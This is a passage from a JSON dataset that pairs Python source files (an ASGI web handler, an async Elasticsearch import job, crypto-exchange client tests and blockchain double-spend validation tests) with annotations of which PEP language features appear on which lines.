            "file": "import asyncio\nimport traceback\nfrom typing import TYPE_CHECKING\nfrom tonberry import response as response_context\nfrom tonberry.context_var_manager import set_context_var\nfrom tonberry.contexted.request import Request\nfrom tonberry.contexted.response import Response\nfrom tonberry.exceptions import HTTPError, HTTPRedirect\nfrom tonberry.models import Receive, Scope, Send\nfrom tonberry.websocket import WebSocket\nif TYPE_CHECKING:\n    from tonberry.app import App\nclass Handler:\n    def __init__(self, app: \"App\", scope: Scope):\n        self.app = app\n        self.scope = scope\n    async def __call__(self, recieve: Receive, send: Send) -> None:\n        raise NotImplementedError\nclass HTTPHandler(Handler):\n    def __init__(self, app: \"App\", scope: Scope):\n        super().__init__(app, scope)\n    async def __call__(self, recieve: Receive, send: Send) -> None:\n        request = Request(self.scope, recieve)\n        try:\n            await self.handle_request(request, send)\n        except HTTPError as err:\n            response = Response()\n            response.status = err.args[0]\n            response.body = str(err.args[0]).encode(\"utf-8\")  \n            set_context_var(response_context, response)\n            self.app.http_access_logger.error()\n            await self.handle_exception(response, send)\n        except HTTPRedirect as err:\n            response = Response()\n            response.status = err.code\n            response.headers[\"Location\"] = err.route\n            set_context_var(response_context, response)\n            self.app.http_access_logger.info()\n            await self.handle_exception(response, send)\n        except Exception as err:\n            response = Response()\n            response.body = traceback.format_exc().encode(\"utf-8\")  \n            response.status = 500\n            set_context_var(response_context, response)\n            self.app.http_access_logger.error()\n            self.app.app_logger.exception(err)\n            await self.handle_exception(response, send)\n    async def handle_request(self, request: Request, send: Send) -> None:\n        session_id = self.app.get_session_id(request)\n        response: Response = await self.app.handle_request(request)\n        if request.headers.get_cookie(\"TBSESSIONID\") is None:\n            response.headers.set_cookie(\n                \"TBSESSIONID\",\n                str(session_id),\n                path=request.path,\n                domain=request.hostname,\n            )\n        try:\n            await asyncio.wait_for(\n                self.respond(send, response), timeout=response.timeout\n            )\n        except asyncio.TimeoutError:\n            pass\n    async def handle_exception(self, response: Response, send: Send) -> None:\n        try:\n            await asyncio.wait_for(\n                self.respond(send, response), timeout=response.timeout\n            )\n        except asyncio.TimeoutError:\n            pass\n    @staticmethod\n    async def respond(send: Send, response: Response) -> None:\n        await send(\n            {\n                \"type\": \"http.response.start\",\n                \"status\": response.status,\n                \"headers\": response.headers.encode(),\n            }\n        )\n        async for data in response.body:\n            await send({\"type\": \"http.response.body\", \"body\": data, \"more_body\": True})\n        await send({\"type\": \"http.response.body\", \"body\": b\"\", \"more_body\": False})\nclass WebSocketHandler(Handler):\n    def __init__(self, app: \"App\", scope: Scope):\n        super().__init__(app, scope)\n    async def __call__(self, recieve: Receive, send: Send) -> None:\n        request = Request(self.scope, recieve)\n        request.method = \"WEBSOCKET\"\n        websocket = WebSocket(self.app, self.scope, recieve, send)\n        await self.app.handle_ws_request(websocket, request)\nclass LifespanHandler(Handler):\n    def __init__(self, app: \"App\", scope: Scope):\n        super().__init__(app, scope)\n    async def __call__(self, recieve: Receive, send: Send) -> None:\n        message = await recieve()\n        if message[\"type\"] == \"lifespan.startup\":\n            try:\n                self.app.startup()\n            except Exception as err:\n                await send({\"type\": \"lifespan.startup.failed\", \"message\": str(err)})\n            else:\n                await send({\"type\": \"lifespan.startup.complete\"})\n        elif message[\"type\"] == \"lifespan.shutdown\":\n            try:\n                self.app.shutdown()\n            except Exception as err:\n                await send({\"type\": \"lifespan.shutdown.failed\", \"message\": str(err)})\n            else:\n                await send({\"type\": \"lifespan.shutdown.complete\"})",
            "patterns": {
                "pep_526": [
                    [
                        50,
                        "response: Response = await self.app.handle_request(request)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_563": [
                    [
                        14,
                        "    def __init__(self, app: \"App\", scope: Scope):",
                        "quoted annotation"
                    ],
                    [
                        20,
                        "    def __init__(self, app: \"App\", scope: Scope):",
                        "quoted annotation"
                    ],
                    [
                        84,
                        "    def __init__(self, app: \"App\", scope: Scope):",
                        "quoted annotation"
                    ],
                    [
                        92,
                        "    def __init__(self, app: \"App\", scope: Scope):",
                        "quoted annotation"
                    ]
                ],
                "pep_525": [
                    [
                        80,
                        81,
                        "async for",
                        "async for data in response.body:\n            await send({\"type\": \"http.response.body\", \"body\": data, \"more_body\": True})"
                    ]
                ]
            }
        },
        "13": {
            "file": "import asyncio\nimport logging\nimport sys\nimport traceback\nfrom copy import deepcopy\nfrom datetime import datetime\nfrom enum import Enum\nfrom typing import Dict, Any\nfrom uuid import uuid4\nfrom .connectors.elasticsearch import ElasticSearch\nfrom .fetch_config import BaseConfig\nlogger = logging.getLogger(\"flask.app.fetch\")\nclass FetchStatus(Enum):\n    FAIL = -1\n    RUNNING = 0\n    SUCCESS = 1\nclass ImportCycle:\n    def __init__(self, import_type: str, tenant_id, config: BaseConfig, get, store, notify):\n        self.config = config\n        self.get = get\n        self.store = store\n        self.notify = notify\n        self.es = ElasticSearch(config.base_es_config)\n        self.status_doc = deepcopy(config.STATUS_DOC)\n        self.fetch_id = self.status_doc[\"fetch_id\"] = uuid4()\n        self.status = self.status_doc[\"status\"] = FetchStatus.RUNNING.name\n        self.status_doc[\"tenant_id\"] = self.tenant_id = tenant_id\n        self.status_doc[\"import_type\"] = import_type\n        self.status_doc[\"start_timestamp\"] = datetime.utcnow().isoformat(timespec='seconds')\n    async def run(self):\n        self.es.insert(self.status_doc, self.status_doc[\"fetch_id\"])\n        concurrent_count = int(self.config.v[\"app_config.concurrent_count\"])\n        dl_tasks = set()\n        event_loop = asyncio.get_event_loop()\n        async for data, halt in self._get():\n            if data is None or halt:\n                raise Exception(f\"get failed, halt, error: {data}\")\n            if len(dl_tasks) >= concurrent_count:\n                _done, dl_tasks = await asyncio.wait(dl_tasks, return_when=asyncio.FIRST_COMPLETED)\n            dl_tasks.add(event_loop.create_task(self._store(data)))\n        await asyncio.wait(dl_tasks)\n        if self.status == FetchStatus.FAIL.name:\n            logger.error(f\"Import Failed, {self.status_doc}\")\n        else:\n            self.status = self.status_doc[\"status\"] = FetchStatus.SUCCESS.name\n        await self._notify()\n        self.es.update(self.status_doc, self.status_doc[\"fetch_id\"])\n        return self.status_doc\n    async def _get(self) -> (Any, bool):\n        try:\n            logger.info(f\"Starting run function {repr(self.get)}\")\n            async for data, count in self.get():\n                self.status_doc['total_records'] += count\n                logger.debug(f\"Get return count: {count} data: {data}\")\n                yield data, False\n        except Exception as e:\n            logger.error(\"Exception thrown by run\")\n            error = repr(traceback.format_exception(*sys.exc_info()))\n            logger.error(error)\n            self.status_doc[\"error\"] = error\n            self.status = self.status_doc[\"status\"] = FetchStatus.FAIL.name\n            self.es.update(self.status_doc, self.status_doc[\"fetch_id\"])\n            yield error, True\n    async def _store(self, data: Dict) -> None:\n        status_doc = deepcopy(self.config.STATUS_DOC)\n        status_doc['start_timestamp'] = datetime.utcnow().isoformat(timespec='seconds')\n        status_doc['import_type'] = 'data_record'\n        status_doc['fetch_id'] = self.fetch_id\n        status_doc['total_records'] = 1\n        status_doc['tenant_id'] = self.tenant_id\n        try:\n            logger.info(f\"Starting store function {repr(self.store)}\")\n            result = await self.store(data, self.fetch_id)\n            status_doc[\"result\"] = result\n            logger.info(\"Store complete\")\n            status_doc['status'] = FetchStatus.SUCCESS.name\n        except Exception:\n            logger.error(\"Exception thrown by store\")\n            error = repr(traceback.format_exception(*sys.exc_info()))\n            logger.error(error)\n            status_doc[\"error\"] = error\n            status_doc[\"status\"] = FetchStatus.FAIL.name\n            self.status = self.status_doc[\"status\"] = FetchStatus.FAIL.name\n        self.status_doc['child_imports'].append(status_doc)\n    async def _notify(self) -> None:\n        notify_status = deepcopy(self.config.NOTIFY_DOC)\n        notify_status[\"function\"] = repr(self.notify)\n        try:\n            logger.info(f\"starting notify function: {repr(self.notify)}\")\n            await self.notify(self.status_doc)\n            logger.info(f\"notify function complete\")\n        except Exception:\n            logger.error(f\"Exception thrown by notify function, halting\")\n            error = repr(traceback.format_exception(*sys.exc_info()))\n            logger.error(error)\n            notify_status[\"error\"] = error\n        finally:\n            self.status_doc[\"notify\"].append(notify_status)",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        8,
                        "from typing import Dict, Any",
                        "suggestion"
                    ]
                ],
                "pep_525": [
                    [
                        49,
                        63,
                        "async generator",
                        "async def _get(self) -> (Any, bool):\n        try:\n            logger.info(f\"Starting run function {repr(self.get)}\")\n            async for data, count in self.get():\n                self.status_doc['total_records'] += count\n                logger.debug(f\"Get return count: {count} data: {data}\")\n                yield data, False\n        except Exception as e:\n            logger.error(\"Exception thrown by run\")\n            error = repr(traceback.format_exception(*sys.exc_info()))\n            logger.error(error)\n            self.status_doc[\"error\"] = error\n            self.status = self.status_doc[\"status\"] = FetchStatus.FAIL.name\n            self.es.update(self.status_doc, self.status_doc[\"fetch_id\"])\n            yield error, True"
                    ],
                    [
                        35,
                        40,
                        "async for",
                        "async for data, halt in self._get():\n            if data is None or halt:\n                raise Exception(f\"get failed, halt, error: {data}\")\n            if len(dl_tasks) >= concurrent_count:\n                _done, dl_tasks = await asyncio.wait(dl_tasks, return_when=asyncio.FIRST_COMPLETED)\n            dl_tasks.add(event_loop.create_task(self._store(data)))"
                    ],
                    [
                        52,
                        55,
                        "async for",
                        "async for data, count in self.get():\n                self.status_doc['total_records'] += count\n                logger.debug(f\"Get return count: {count} data: {data}\")\n                yield data, False"
                    ]
                ],
                "pep_498": [
                    [
                        43,
                        "            logger.error(f\"Import Failed, {self.status_doc}\")"
                    ],
                    [
                        51,
                        "            logger.info(f\"Starting run function {repr(self.get)}\")"
                    ],
                    [
                        72,
                        "            logger.info(f\"Starting store function {repr(self.store)}\")"
                    ],
                    [
                        89,
                        "            logger.info(f\"starting notify function: {repr(self.notify)}\")"
                    ],
                    [
                        91,
                        "            logger.info(f\"notify function complete\")"
                    ],
                    [
                        37,
                        "                raise Exception(f\"get failed, halt, error: {data}\")"
                    ],
                    [
                        54,
                        "                logger.debug(f\"Get return count: {count} data: {data}\")"
                    ],
                    [
                        93,
                        "            logger.error(f\"Exception thrown by notify function, halting\")"
                    ]
                ]
            }
        },
        "14": {
            "file": "import asyncio\nimport pytest\nimport cryptocom.exchange as cro\n@pytest.mark.asyncio\nasync def test_account_get_balance(account: cro.Account):\n    balances = await account.get_balance()\n    while balances[cro.coins.CRO].available < 5:\n        await account.buy_market(cro.pairs.CRO_USDT, 1)\n        balances = await account.get_balance()\n    while balances[cro.coins.USDT].available < 1:\n        await account.sell_market(cro.pairs.CRO_USDT, 1)\n        balances = await account.get_balance()\n    balances = await account.get_balance()\n    local_coins = cro.coins.all()\n    assert balances[cro.coins.CRO].available > 5\n    assert balances[cro.coins.USDT].available > 1\n    for coin in balances:\n        assert coin in local_coins\n@pytest.mark.asyncio\nasync def test_no_duplicate_mass_limit_orders(\n        exchange: cro.Exchange, account: cro.Account):\n    buy_price = round(await exchange.get_price(cro.pairs.CRO_USDT) / 2, 4)\n    orders_count = 100\n    order_ids = await asyncio.gather(*[\n        account.buy_limit(\n            cro.pairs.CRO_USDT, 0.001,\n            round(buy_price + i * 0.0001, 4)\n        )\n        for i in range(orders_count)\n    ])\n    real_orders = await asyncio.gather(*[\n        account.get_order(id_)\n        for id_ in order_ids\n    ])\n    for order in real_orders:\n        assert order.is_active, order\n    await asyncio.sleep(2)\n    open_orders = await account.get_open_orders(cro.pairs.CRO_USDT)\n    open_order_ids = sorted(o.id for o in open_orders if o.is_active)\n    assert len(real_orders) == len(open_order_ids) == orders_count\n    assert open_order_ids == sorted(order_ids)\n@pytest.mark.asyncio\nasync def test_account_limit_orders(\n        account: cro.Account, exchange: cro.Exchange):\n    buy_price = round(await exchange.get_price(cro.pairs.CRO_USDT) / 2, 4)\n    order_ids = await asyncio.gather(*[\n        account.buy_limit(cro.pairs.CRO_USDT, 0.001, buy_price)\n        for i in range(25)\n    ])\n    order_ids += await asyncio.gather(*[\n        account.sell_limit(cro.pairs.CRO_USDT, 0.001, round(buy_price * 4, 4))\n        for i in range(25)\n    ])\n    all_orders = await account.get_orders_history(\n        cro.pairs.CRO_USDT, page_size=50)\n    await account.cancel_order(\n        order_ids[0], cro.pairs.CRO_USDT, check_status=True)\n    order = await account.get_order(order_ids[0])\n    assert order.is_canceled\n    for order_id in order_ids[1:]:\n        await account.cancel_order(order_id, cro.pairs.CRO_USDT)\n    open_orders = [\n        order\n        for order in await account.get_open_orders()\n        if order.id in order_ids\n    ]\n    assert not open_orders\n    all_orders = await account.get_orders_history(\n        cro.pairs.CRO_USDT, page_size=50)\n    ids = [order.id for order in all_orders]\n    assert set(ids) & set(order_ids)\nasync def make_trades(account, exchange, order_ids):\n    price = await exchange.get_price(cro.pairs.CRO_USDT)\n    order_id = await account.buy_market(cro.pairs.CRO_USDT, price / 10)\n    order = await account.get_order(order_id)\n    assert order.is_filled\n    assert order_id == order.id\n    order_ids['buy'].append(order.id)\n    order_id = await account.sell_market(cro.pairs.CRO_USDT, 0.1)\n    order = await account.get_order(order_id)\n    assert order.is_filled\n    assert order_id == order.id\n    order_ids['sell'].append(order.id)\nasync def listen_orders(account: cro.Account, orders):\n    async for order in account.listen_orders(cro.pairs.CRO_USDT):\n        orders.append(order)\n@pytest.mark.asyncio\nasync def test_account_market_orders(\n        account: cro.Account, exchange: cro.Exchange):\n    order_ids = {'buy': [], 'sell': []}\n    orders = []\n    task = asyncio.create_task(listen_orders(account, orders))\n    await asyncio.sleep(5)\n    await asyncio.gather(*[\n        make_trades(account, exchange, order_ids) for _ in range(10)\n    ])\n    await asyncio.sleep(1)\n    orders = await asyncio.gather(*[\n        account.get_order(order_id)\n        for order_id in order_ids['buy'] + order_ids['sell']\n    ])\n    for order in orders:\n        assert order.trades, order\n    trades = await account.get_trades(cro.pairs.CRO_USDT, page_size=20)\n    for trade in trades:\n        if trade.is_buy:\n            assert trade.order_id in order_ids['buy']\n            assert trade.order_id not in order_ids['sell']\n        elif trade.is_sell:\n            assert trade.order_id in order_ids['sell']\n            assert trade.order_id not in order_ids['buy']\n    await asyncio.sleep(10)\n    assert len(orders) >= len(order_ids['buy']) + len(order_ids['sell'])\n    if not task.cancelled():\n        task.cancel()\n    await asyncio.sleep(1)",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        85,
                        86,
                        "async for",
                        "async for order in account.listen_orders(cro.pairs.CRO_USDT):\n        orders.append(order)"
                    ]
                ]
            }
        },
        "15": {
            "file": "import asyncio\nimport logging\nimport pytest\nfrom clvm.casts import int_to_bytes\nfrom ceres.consensus.blockchain import ReceiveBlockResult\nfrom ceres.protocols import full_node_protocol\nfrom ceres.types.announcement import Announcement\nfrom ceres.types.condition_opcodes import ConditionOpcode\nfrom ceres.types.condition_with_args import ConditionWithArgs\nfrom ceres.types.spend_bundle import SpendBundle\nfrom ceres.util.errors import ConsensusError, Err\nfrom ceres.util.ints import uint64\nfrom tests.wallet_tools import WalletTool\nfrom tests.core.full_node.test_full_node import connect_and_get_peer\nfrom tests.setup_nodes import bt, setup_two_nodes, test_constants\nfrom tests.util.generator_tools_testing import run_and_get_removals_and_additions\nBURN_PUZZLE_HASH = b\"0\" * 32\nWALLET_A = WalletTool(test_constants)\nWALLET_A_PUZZLE_HASHES = [WALLET_A.get_new_puzzlehash() for _ in range(5)]\nlog = logging.getLogger(__name__)\n@pytest.fixture(scope=\"session\")\ndef event_loop():\n    loop = asyncio.get_event_loop()\n    yield loop\nclass TestBlockchainTransactions:\n    @pytest.fixture(scope=\"function\")\n    async def two_nodes(self):\n        async for _ in setup_two_nodes(test_constants):\n            yield _\n    @pytest.mark.asyncio\n    async def test_basic_blockchain_tx(self, two_nodes):\n        num_blocks = 10\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        peer = await connect_and_get_peer(server_1, server_2)\n        full_node_1 = full_node_api_1.full_node\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block), None)\n        spend_block = blocks[2]\n        spend_coin = None\n        for coin in list(spend_block.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin = coin\n        spend_bundle = wallet_a.generate_signed_transaction(1000, receiver_puzzlehash, spend_coin)\n        assert spend_bundle is not None\n        tx: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle)\n        await full_node_api_1.respond_transaction(tx, peer)\n        sb = full_node_1.mempool_manager.get_spendbundle(spend_bundle.name())\n        assert sb is spend_bundle\n        last_block = blocks[-1]\n        next_spendbundle, additions, removals = await full_node_1.mempool_manager.create_bundle_from_mempool(\n            last_block.header_hash\n        )\n        assert next_spendbundle is not None\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            block_list_input=blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=next_spendbundle,\n            guarantee_transaction_block=True,\n        )\n        next_block = new_blocks[-1]\n        await full_node_1.respond_block(full_node_protocol.RespondBlock(next_block))\n        assert next_block.header_hash == full_node_1.blockchain.get_peak().header_hash\n        added_coins = next_spendbundle.additions()\n        assert len(added_coins) == 2\n        for coin in added_coins:\n            unspent = await full_node_1.coin_store.get_coin_record(coin.name())\n            assert unspent is not None\n            assert not unspent.spent\n            assert not unspent.coinbase\n    @pytest.mark.asyncio\n    async def test_validate_blockchain_with_double_spend(self, two_nodes):\n        num_blocks = 5\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_3, server_1, server_2 = two_nodes\n        full_node_1 = full_node_api_1.full_node\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        spend_block = blocks[2]\n        spend_coin = None\n        for coin in list(spend_block.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin = coin\n        spend_bundle = wallet_a.generate_signed_transaction(1000, receiver_puzzlehash, spend_coin)\n        spend_bundle_double = wallet_a.generate_signed_transaction(1001, receiver_puzzlehash, spend_coin)\n        block_spendbundle = SpendBundle.aggregate([spend_bundle, spend_bundle_double])\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            block_list_input=blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=block_spendbundle,\n            guarantee_transaction_block=True,\n        )\n        next_block = new_blocks[-1]\n        res, err, _ = await full_node_1.blockchain.receive_block(next_block)\n        assert res == ReceiveBlockResult.INVALID_BLOCK\n        assert err == Err.DOUBLE_SPEND\n    @pytest.mark.asyncio\n    async def test_validate_blockchain_duplicate_output(self, two_nodes):\n        num_blocks = 3\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        full_node_1 = full_node_api_1.full_node\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        spend_block = blocks[2]\n        spend_coin = None\n        for coin in list(spend_block.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin = coin\n        spend_bundle = wallet_a.generate_signed_transaction(\n            1000, receiver_puzzlehash, spend_coin, additional_outputs=[(receiver_puzzlehash, 1000)]\n        )\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            block_list_input=blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=spend_bundle,\n            guarantee_transaction_block=True,\n        )\n        next_block = new_blocks[-1]\n        res, err, _ = await full_node_1.blockchain.receive_block(next_block)\n        assert res == ReceiveBlockResult.INVALID_BLOCK\n        assert err == Err.DUPLICATE_OUTPUT\n    @pytest.mark.asyncio\n    async def test_validate_blockchain_with_reorg_double_spend(self, two_nodes):\n        num_blocks = 10\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        spend_block = blocks[2]\n        spend_coin = None\n        for coin in list(spend_block.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin = coin\n        spend_bundle = wallet_a.generate_signed_transaction(1000, receiver_puzzlehash, spend_coin)\n        blocks_spend = bt.get_consecutive_blocks(\n            1,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            guarantee_transaction_block=True,\n            transaction_data=spend_bundle,\n        )\n        for block in blocks_spend:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        new_blocks = bt.get_consecutive_blocks(\n            7,\n            blocks[:6],\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            guarantee_transaction_block=True,\n            seed=b\"another seed\",\n        )\n        for block in new_blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            new_blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            guarantee_transaction_block=True,\n            transaction_data=spend_bundle,\n        )\n        res, err, _ = await full_node_api_1.full_node.blockchain.receive_block(new_blocks[-1])\n        assert err is None\n        assert res == ReceiveBlockResult.NEW_PEAK\n        new_blocks_double = bt.get_consecutive_blocks(\n            1,\n            new_blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            guarantee_transaction_block=True,\n            transaction_data=spend_bundle,\n        )\n        res, err, _ = await full_node_api_1.full_node.blockchain.receive_block(new_blocks_double[-1])\n        assert err is Err.DOUBLE_SPEND\n        assert res == ReceiveBlockResult.INVALID_BLOCK\n        new_blocks_reorg = bt.get_consecutive_blocks(\n            1,\n            new_blocks[:12],\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            guarantee_transaction_block=True,\n            transaction_data=spend_bundle,\n            seed=b\"spend at 12 is ok\",\n        )\n        for block in new_blocks_reorg:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        new_blocks_reorg = bt.get_consecutive_blocks(\n            1,\n            new_blocks[:13],\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            guarantee_transaction_block=True,\n            transaction_data=spend_bundle,\n            seed=b\"spend at 13 is ok\",\n        )\n        for block in new_blocks_reorg:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        new_blocks_reorg = bt.get_consecutive_blocks(\n            1,\n            new_blocks[:14],\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            guarantee_transaction_block=True,\n            transaction_data=spend_bundle,\n            seed=b\"spend at 14 is double spend\",\n        )\n        with pytest.raises(ConsensusError):\n            for block in new_blocks_reorg:\n                await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n    @pytest.mark.asyncio\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    async def test_validate_blockchain_spend_reorg_coin(self, two_nodes, rust_checker: bool):\n        num_blocks = 10\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_1_puzzlehash = WALLET_A_PUZZLE_HASHES[1]\n        receiver_2_puzzlehash = WALLET_A_PUZZLE_HASHES[2]\n        receiver_3_puzzlehash = WALLET_A_PUZZLE_HASHES[3]\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        spend_block = blocks[2]\n        spend_coin = None\n        for coin in list(spend_block.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin = coin\n        assert spend_coin\n        spend_bundle = wallet_a.generate_signed_transaction(uint64(1000), receiver_1_puzzlehash, spend_coin)\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks[:5],\n            seed=b\"spend_reorg_coin\",\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=spend_bundle,\n            guarantee_transaction_block=True,\n        )\n        await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(new_blocks[-1]))\n        coin_2 = None\n        for coin in run_and_get_removals_and_additions(\n            new_blocks[-1], test_constants.MAX_BLOCK_COST_CLVM, test_constants.COST_PER_BYTE, rust_checker=rust_checker\n        )[1]:\n            if coin.puzzle_hash == receiver_1_puzzlehash:\n                coin_2 = coin\n                break\n        assert coin_2 is not None\n        spend_bundle = wallet_a.generate_signed_transaction(uint64(1000), receiver_2_puzzlehash, coin_2)\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            new_blocks[:6],\n            seed=b\"spend_reorg_coin\",\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=spend_bundle,\n            guarantee_transaction_block=True,\n        )\n        await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(new_blocks[-1]))\n        coin_3 = None\n        for coin in run_and_get_removals_and_additions(\n            new_blocks[-1], test_constants.MAX_BLOCK_COST_CLVM, test_constants.COST_PER_BYTE, rust_checker=rust_checker\n        )[1]:\n            if coin.puzzle_hash == receiver_2_puzzlehash:\n                coin_3 = coin\n                break\n        assert coin_3 is not None\n        spend_bundle = wallet_a.generate_signed_transaction(uint64(1000), receiver_3_puzzlehash, coin_3)\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            new_blocks[:7],\n            seed=b\"spend_reorg_coin\",\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=spend_bundle,\n            guarantee_transaction_block=True,\n        )\n        await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(new_blocks[-1]))\n    @pytest.mark.asyncio\n    async def test_validate_blockchain_spend_reorg_cb_coin(self, two_nodes):\n        num_blocks = 15\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_1_puzzlehash = WALLET_A_PUZZLE_HASHES[1]\n        blocks = bt.get_consecutive_blocks(num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash)\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        new_blocks = bt.get_consecutive_blocks(\n            5,\n            blocks[:6],\n            seed=b\"reorg cb coin\",\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            guarantee_transaction_block=True,\n        )\n        for block in new_blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        spend_block = new_blocks[-1]\n        spend_coin = None\n        for coin in list(spend_block.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin = coin\n        spend_bundle = wallet_a.generate_signed_transaction(1000, receiver_1_puzzlehash, spend_coin)\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            new_blocks,\n            seed=b\"reorg cb coin\",\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=spend_bundle,\n            guarantee_transaction_block=True,\n        )\n        await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(new_blocks[-1]))\n    @pytest.mark.asyncio\n    async def test_validate_blockchain_spend_reorg_since_genesis(self, two_nodes):\n        num_blocks = 10\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_1_puzzlehash = WALLET_A_PUZZLE_HASHES[1]\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        spend_block = blocks[-1]\n        spend_coin = None\n        for coin in list(spend_block.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin = coin\n        spend_bundle = wallet_a.generate_signed_transaction(1000, receiver_1_puzzlehash, spend_coin)\n        new_blocks = bt.get_consecutive_blocks(\n            1, blocks, seed=b\"\", farmer_reward_puzzle_hash=coinbase_puzzlehash, transaction_data=spend_bundle\n        )\n        await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(new_blocks[-1]))\n        new_blocks = bt.get_consecutive_blocks(\n            12,\n            [],\n            seed=b\"reorg since genesis\",\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            guarantee_transaction_block=True,\n        )\n        for block in new_blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            new_blocks,\n            